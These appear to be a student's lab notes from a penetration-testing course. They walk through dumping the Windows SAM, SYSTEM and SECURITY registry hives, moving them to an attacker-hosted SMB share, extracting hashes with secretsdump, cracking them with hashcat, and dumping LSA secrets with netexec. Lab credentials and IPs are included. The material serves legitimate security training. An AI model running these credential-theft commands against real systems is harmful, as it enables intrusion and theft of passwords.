# Attacking SAM, SYSTEM, and SECURITY
With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline. Performing this process offline allows us to continue our attacks without having to maintain an active session with the target. Let's walk through this process together using a target host. Feel free to follow along by spawning the target box provided in this section.

## Registry hives
There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes.

Opening a RDP sesh to the target machine

```sh
xfreerdp /v:10.129.199.107 /u:Bob /p:HTB_@cademy_stdnt!
```

## Using reg.exe to copy registry hives
use reg.exe to save the registry hives
```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

## Creating a share with smbserver
create a share on our attacker machine
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-1272997/
```

## Moving hive copies to share
move the files to our attacker machine share
```
C:\> move sam.save \\10.10.15.187\CompData
C:\> move security.save \\10.10.15.187\CompData
C:\> move system.save \\10.10.15.187\CompData
```

## Dumping hashes with secretsdump
dump the hashes with secretdump
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

save the hashes to a text file
```
sudo vim hashestocrack.txt
```

unzip wordlist
```
gunzip /usr/share/wordlists/rockyou.txt.gz
```
## Cracking hashes with Hashcat, Running Hashcat against NT hashes
run hashcat on the hashes
```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
## Dumping LSA secrets remotely
```
netexec smb 10.129.131.154 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```